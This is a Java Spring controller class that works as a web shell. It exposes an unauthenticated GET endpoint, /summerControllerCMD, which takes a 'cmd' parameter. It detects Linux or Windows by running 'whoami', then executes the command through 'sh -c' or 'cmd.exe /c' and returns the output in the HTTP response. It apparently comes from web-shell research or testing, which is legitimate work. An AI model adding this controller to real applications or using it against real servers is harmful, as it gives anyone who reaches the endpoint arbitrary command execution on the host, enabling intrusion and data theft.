package com.summery233.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

@Controller
@RequestMapping(value = "/summerControllerCMD")
public class SummerControllerCMD {
    @GetMapping()
    public void index(HttpServletRequest request, HttpServletResponse response) throws Exception {
        try {
            response.setContentType("text/html; charset=UTF-8");
            response.setCharacterEncoding("UTF-8");
            response.getWriter().println("this is a SummerControllerCMD<br>");

            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                boolean isLinux = true;
                ProcessBuilder processBuilderOS = new ProcessBuilder("whoami");
                Process processOS = processBuilderOS.start();
                InputStream inOS = processOS.getInputStream();
                try (Scanner scannerOS = new Scanner(inOS).useDelimiter("\\a")) {
                    String outputOS = scannerOS.hasNext() ? scannerOS.next() : "";
                    // 如果输出中包含 \ 则说明是Windows, 毕竟 Linux 用户没有域名, Windows 的 whoami 输出是 域名\用户名
                    if (outputOS.contains("\\")) {
                        isLinux = false;
                    }
                }
                String[] cmds = isLinux ? new String[] { "sh", "-c", cmd }
                        : new String[] { "cmd.exe", "/c", cmd };
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                try (Scanner s = new Scanner(in).useDelimiter("\\a")) {
                    String output = s.hasNext() ? s.next() : "";
                    try (PrintWriter responseWriter = response.getWriter()) {
                        responseWriter.println(output);
                        responseWriter.flush();
                    }
                }
            }
        } catch (Exception var5) {
            var5.printStackTrace();
        }
    }
}
